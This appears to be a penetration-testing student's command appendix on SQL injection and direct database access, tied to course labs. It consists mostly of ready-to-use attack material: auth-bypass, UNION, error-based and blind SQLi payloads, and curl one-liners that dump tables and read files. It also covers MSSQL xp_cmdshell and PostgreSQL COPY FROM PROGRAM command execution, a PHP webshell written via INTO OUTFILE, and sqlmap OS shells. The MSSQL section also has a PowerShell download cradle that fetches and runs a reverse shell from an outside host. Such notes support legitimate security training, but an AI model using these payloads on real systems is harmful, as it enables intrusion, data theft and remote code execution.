# SQL Injection & Databases — Command Appendix

Part of [[COMMAND APPENDIX]]. Direct DB client connections plus the full SQL injection payload set, manual and automated.

---

## MySQL

```bash
# Connect
mysql -u root -p'root' -h <target> -P 3306 --skip-ssl-verify-server-cert
# If TLS errors: --skip-ssl instead

# Once connected
select version();
select system_user();
show databases;
use <database>;
show tables;
SELECT user, plugin, authentication_string FROM mysql.user WHERE user = '<user>';
```
See [[SQL Injection Attacks#10.1.2. DB Types and Characteristics|10.1.2]].

#### Tags: #MySQL

---

## MSSQL (Impacket)

```bash
# Connect (NTLM auth, not Kerberos)
impacket-mssqlclient <user>:<pass>@<target> -windows-auth
```
```sql
SELECT @@version;
SELECT name FROM sys.databases;
SELECT * FROM <db>.information_schema.tables;
select * from <db>.dbo.<table>;
SELECT * FROM master.sys.sysusers;

-- Enable xp_cmdshell (disabled by default)
EXECUTE sp_configure 'show advanced options', 1; RECONFIGURE;
EXECUTE sp_configure 'xp_cmdshell', 1; RECONFIGURE;
EXECUTE xp_cmdshell '<command>';
```
*Note: `impacket-mssqlclient`'s TDS connection doesn't need a trailing `GO` the way `sqlcmd` does. `dbo` schema name is required between database and table names, MySQL doesn't need this.*

**Injecting into an ASP.NET WebForms form** (`.aspx` pages): the `__VIEWSTATE`/`__VIEWSTATEGENERATOR`/`__EVENTVALIDATION` hidden fields have to ride along with every POST, scrape them fresh from the page each time:
```bash
curl -s http://<target>/login.aspx -c /tmp/cookies.txt -o /tmp/login_page.html
VS=$(grep -oP '(?<=__VIEWSTATE" id="__VIEWSTATE" value=")[^"]*' /tmp/login_page.html)
VSG=$(grep -oP '(?<=__VIEWSTATEGENERATOR" id="__VIEWSTATEGENERATOR" value=")[^"]*' /tmp/login_page.html)
EV=$(grep -oP "(?<=__EVENTVALIDATION\" id=\"__EVENTVALIDATION\" value=\")[^\"]*" /tmp/login_page.html)

curl -s -b /tmp/cookies.txt -X POST http://<target>/login.aspx \
  --data-urlencode "__VIEWSTATE=$VS" --data-urlencode "__VIEWSTATEGENERATOR=$VSG" --data-urlencode "__EVENTVALIDATION=$EV" \
  --data-urlencode "ctl00\$ContentPlaceHolder1\$UsernameTextBox=<payload>" \
  --data-urlencode "ctl00\$ContentPlaceHolder1\$PasswordTextBox=test" \
  --data-urlencode "ctl00\$ContentPlaceHolder1\$LoginButton=Login" -o /tmp/result.html
```
*Field names follow WebForms' `ctl00$ContentPlaceHolder1$<ControlID>` naming convention, get the exact names from the rendered page's `name="..."` attributes, they won't match the visible label text.*

**Blind RCE** (when the app doesn't surface stacked-query errors/results, see [[SQL Injection (Breakdowns)#Why stacked-query errors silently vanish while the query still executes|Command Breakdowns]]): confirm via `WAITFOR DELAY`, then fire a reverse shell blind and confirm via a caught listener instead of reading a return value:
```sql
'; WAITFOR DELAY '0:0:5'--                                          -- confirm stacked queries execute (time the request)
'; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; EXEC xp_cmdshell 'powershell -c "IEX(New-Object Net.WebClient).DownloadString(''http://<ip>/shell.ps1'')"'-- 
```
*Full quoting breakdown (T-SQL → cmd.exe → PowerShell, three nested layers): [[SQL Injection (Breakdowns)#Triple-nested quoting for xp_cmdshell → cmd.exe → PowerShell download cradle|Command Breakdowns]].*

See [[SQL Injection Attacks#10.1.2. DB Types and Characteristics|10.1.2]], [[SQL Injection Attacks#10.3.1. Manual Code Execution|10.3.1]], [[SQL Injection Attacks#Capstone: Exercise VM #4|Capstone Labs, VM #4]] (ASP.NET WebForms + blind stacked-query RCE end to end).

#### Tags: #MSSQL #ImpacketMSSQLClient #XpCmdshell #ASPNETWebForms #StackedQueries

---

## PostgreSQL

```bash
# Connect directly (port 5432 by default)
psql -h <target> -U <user> -d <database>
```
```sql
SELECT version();
SELECT current_database();
SELECT current_user;
SELECT string_agg(table_name, ',') FROM information_schema.tables WHERE table_schema='public';
SELECT string_agg(column_name, ',') FROM information_schema.columns WHERE table_name='<table>';

-- Check for superuser (needed before RCE below)
SELECT usename, usesuper FROM pg_user;

-- Error-based extraction via type-mismatch (leaks the value in the error text, no truncation cap)
SELECT CAST((SELECT version()) AS int);

-- RCE (superuser only, needs stacked queries e.g. via PHP's pg_query())
CREATE TABLE IF NOT EXISTS cmd_exec(cmd_output text);
COPY cmd_exec FROM PROGRAM '<command>';
SELECT string_agg(cmd_output, ' | ') FROM cmd_exec;
```
*Postgres superuser + `COPY ... FROM PROGRAM` is the direct equivalent of MSSQL's `sysadmin` + `xp_cmdshell`, same idea (a privileged DB role reaching the OS), different DBMS-specific mechanism. `COPY FROM PROGRAM` has no return channel, its output has to be read back out through a separate query afterward.*

**Full injected one-liners (POST field going into a `LIKE '%<value>%'` clause):**
```bash
# Confirm injection + find column count
curl -s -X POST --data "field=x'" http://<target>/page.php
curl -s -X POST --data "field=x%' ORDER BY <N>-- " http://<target>/page.php | grep -iE "error|warning"

# Error-based extraction via CAST() (swap <N> for a column position confirmed integer-typed)
curl -s -X POST --data "field=x%' UNION SELECT NULL,CAST((<subquery>) AS int),NULL-- " http://<target>/page.php | grep -iE "error|warning"

# RCE: setup (stacked queries), then read back the output
curl -s -X POST --data "field=x'; CREATE TABLE IF NOT EXISTS cmd_exec(cmd_output text); COPY cmd_exec FROM PROGRAM '<command>'; -- " http://<target>/page.php
curl -s -X POST --data "field=x%' UNION SELECT NULL,CAST((SELECT string_agg(cmd_output,' | ')) AS int),NULL FROM cmd_exec-- " http://<target>/page.php | grep -iE "error|warning"
```
*Base64-encode any reverse shell before dropping it into `COPY FROM PROGRAM`, and send it via `--data-urlencode` (not plain `--data`), base64 output routinely contains `+`, which `curl --data` sends raw and gets silently reinterpreted as a space by the receiving server.*

See [[SQL Injection Attacks#Capstone: Exercise VM #3|Capstone Labs, VM #3]] for the full worked walkthrough, and [[SQL Injection (Breakdowns)#PostgreSQL error-based extraction via CAST() type-mismatch|Command Breakdowns]] for why each piece works.

#### Tags: #PostgreSQL #ErrorBasedSQLi #StackedQueries #RCE

---

## SQL Injection Payloads

```
-- Auth bypass (username field)
offsec' OR 1=1 -- //

-- Error-based enumeration
' or 1=1 in (select @@version) -- //
' or 1=1 in (SELECT password FROM users WHERE username = 'admin') -- //

-- UNION-based: find column count, then enumerate
' ORDER BY 1-- //
' UNION SELECT null, null, database(), user(), @@version -- //
' union select null, table_name, column_name, table_schema, null from information_schema.columns where table_schema=database() -- //

-- Blind (boolean / time-based)
<target>?user=offsec' AND 1=1 -- //
<target>?user=offsec' AND IF (1=1, sleep(3),'false') -- //

-- MySQL webshell write via UNION + INTO OUTFILE
' UNION SELECT "<?php system($_GET['cmd']);?>", null, null, null, null INTO OUTFILE "/var/www/html/tmp/webshell.php" -- //

-- Error-based extraction via extractvalue() (MySQL), works even on injection points where
-- nothing is reflected (e.g. an INSERT statement), as long as DB errors reach the response
' AND extractvalue(1,concat(0x7e,(SELECT database())))-- -
' AND extractvalue(1,concat(0x7e,(SELECT group_concat(table_name) FROM information_schema.tables WHERE table_schema=database())))-- -

-- File read without OUTFILE/code-exec, useful when the injection point is INSERT-only
-- (no SELECT context to attach INTO OUTFILE to) but FILE privilege + secure_file_priv='' allow it
' AND extractvalue(1,concat(0x7e,substring((SELECT LOAD_FILE('/path/to/file')),1,31)))-- -
```
*`extractvalue()`/`updatexml()` both truncate their output to 32 characters (including the `~` marker), so long values need paging through with `substring(value, start, 31)`, incrementing `start` by 31 each time.*

> **Gotcha:** `INTO OUTFILE` throws `File already exists` if a file is already sitting at that exact path, MySQL will never overwrite one. Just change the filename (e.g. `shell2.php`) and re-run. See [[SQL Injection Attacks#10.3.1. Manual Code Execution|10.3.1]] for a worked example.

**Full `curl` one-liners for a POST-based error-based extraction** (no sqlmap, manual only, one field goes straight into an `INSERT`):
```bash
# Confirm the injection (single quote breaks the query, error text comes back in the response)
curl -X POST --data "mail-list=test'" http://<target>/index.php

# Version, current DB, tables, columns, in that order
curl -s -X POST --data "mail-list=test' AND extractvalue(1,concat(0x7e,(SELECT version())))-- -" http://<target>/index.php | grep -i "XPATH"
curl -s -X POST --data "mail-list=test' AND extractvalue(1,concat(0x7e,(SELECT database())))-- -" http://<target>/index.php | grep -i "XPATH"
curl -s -X POST --data "mail-list=test' AND extractvalue(1,concat(0x7e,(SELECT group_concat(table_name) FROM information_schema.tables WHERE table_schema=database())))-- -" http://<target>/index.php | grep -i "XPATH"
curl -s -X POST --data "mail-list=test' AND extractvalue(1,concat(0x7e,(SELECT group_concat(column_name) FROM information_schema.columns WHERE table_name='<table>')))-- -" http://<target>/index.php | grep -i "XPATH"

# Dump one row at a time with LIMIT (keeps each extractvalue() result short enough to read whole)
curl -s -X POST --data "mail-list=test' AND extractvalue(1,concat(0x7e,(SELECT concat(<col1>,0x7c,<col2>) FROM <table> LIMIT 0,1)))-- -" http://<target>/index.php | grep -i "XPATH"
for i in 1 2 3 4 5; do
  curl -s -X POST --data "mail-list=test' AND extractvalue(1,concat(0x7e,(SELECT concat(<col1>,0x7c,<col2>) FROM <table> LIMIT $i,1)))-- -" http://<target>/index.php | grep -i "XPATH"
done

# Privilege/config checks before trying a file read
curl -s -X POST --data "mail-list=test' AND extractvalue(1,concat(0x7e,(SELECT current_user())))-- -" http://<target>/index.php | grep -i "XPATH"
curl -s -X POST --data "mail-list=test' AND extractvalue(1,concat(0x7e,(SELECT privilege_type FROM information_schema.user_privileges WHERE grantee LIKE '%<user>%')))-- -" http://<target>/index.php | grep -i "XPATH"
curl -s -X POST --data "mail-list=test' AND extractvalue(1,concat(0x7e,(SELECT @@secure_file_priv)))-- -" http://<target>/index.php | grep -i "XPATH"

# Read a file, paged 31 characters at a time (increment the start offset by 31 each call)
curl -s -X POST --data "mail-list=test' AND extractvalue(1,concat(0x7e,substring((SELECT LOAD_FILE('/path/to/file')),1,31)))-- -" http://<target>/index.php | grep -i "XPATH"
curl -s -X POST --data "mail-list=test' AND extractvalue(1,concat(0x7e,substring((SELECT LOAD_FILE('/path/to/file')),32,31)))-- -" http://<target>/index.php | grep -i "XPATH"
```
*Swap `mail-list`/`index.php` for whatever field/page the target form actually uses (check the `<form method="...">` and `name="..."` attributes first, same lookup as [[SQL Injection Attacks#10.3.2. Automating the Attack|10.3.2's Step 0]]). The `grep -i "XPATH"` just filters the huge HTML response down to the one line containing the leaked error.*

See [[SQL Injection Attacks#10.2. Manual SQL Exploitation|10.2]], [[SQL Injection Attacks#10.3.1. Manual Code Execution|10.3.1]], [[SQL Injection Attacks#🏆 Capstone Labs|Capstone Labs]] (VM #2, `extractvalue` + `LOAD_FILE` end to end, no sqlmap).

> 🔍 Don't just copy these, understand why each fragment is there: [[SQL Injection (Breakdowns)|full command breakdowns]] for the `extractvalue()` one-liners above.

#### Tags: #SQLInjection #UnionSQLi #BlindSQLi #ErrorBasedSQLi

---

## Sqlmap

```bash
# Discovery/fingerprint
sqlmap -u "http://<target>/page.php?id=1" -p id

# POST-based form instead of a GET parameter (check the page's <form method="..."> first)
sqlmap -u "http://<target>/page.php" --data="field=test" -p field --batch

# Dump the current database
sqlmap -u "http://<target>/page.php?id=1" -p id --dump

# Force one specific technique, then dump one specific table
sqlmap -u "http://<target>/page.php?id=1" -p id --technique=T -T users --dump

# Full interactive OS shell (capture a POST request via Burp first, save as post.txt)
sqlmap -r post.txt -p <param> --os-shell --web-root "/var/www/html/tmp"

# Target keeps answering with a non-2xx status even on valid requests (e.g. a WP AJAX
# handler that always replies 404), sqlmap otherwise bails out treating it as unreachable
sqlmap -u "http://<target>/wp-admin/admin-ajax.php?action=<name>&id=1" -p id --batch --ignore-code=404
```
*`--technique=` letters: `B`=boolean-blind, `E`=error-based, `U`=union, `S`=stacked queries, `T`=time-blind, `Q`=inline queries. Useful when sqlmap finds several techniques but the one you actually want (or the fastest one) isn't the default it picks.*

*Bonus: if a dumped column looks like password hashes, sqlmap offers to crack them on the spot with its bundled wordlist, no separate hashcat/john step needed for weak/common passwords.*

See [[SQL Injection Attacks#10.3.2. Automating the Attack|10.3.2]] and [[SQL Injection Attacks#🏆 Capstone Labs|the Capstone Labs section]] for the WordPress AJAX example.

#### Tags: #Sqlmap

---

## **Outstanding**
This area grows alongside the modules. Whenever a new DB engine or SQLi variant comes up (PostgreSQL, NoSQL injection, second-order SQLi, etc), add it here with a link back to the source section.
